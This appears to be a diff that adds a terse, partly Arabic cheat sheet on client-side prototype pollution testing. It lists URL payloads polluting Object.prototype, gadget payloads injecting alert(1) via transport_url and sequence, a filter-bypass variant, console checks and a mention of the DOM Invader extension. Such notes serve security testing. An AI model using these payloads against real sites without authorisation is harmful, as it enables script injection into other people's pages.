@@ -1,0 +1,36 @@
+url
+?__proto__[foo]=bar
+?__proto__.foo=bar
+/?__proto__[transport_url]=data:,alert(1);
+
+?__proto__.sequence=alert(1)
+?__proto__.sequence=alert(1)-
+?__pro__proto__to__.gadget=payload
+
+بدائل بروتو 
+let myObjectLiteral = {};
+let myObject = new Object();
+myObjectLiteral.constructor            // function Object(){...}
+myObject.constructor                   // function Object(){...}
+
+myObject.constructor.prototype
+
+finc
+
+eval()
+[transport_url]
+
+console
+
+
+Object.prototype.foo
+// "bar" indicates that you have successfully polluted the prototype
+// undefined indicates that the attack was not successful
+
+
+extntions 
+DOM Invader
+
+
+لكتشاف تفعيل البايلود
+Object.__proto__ 
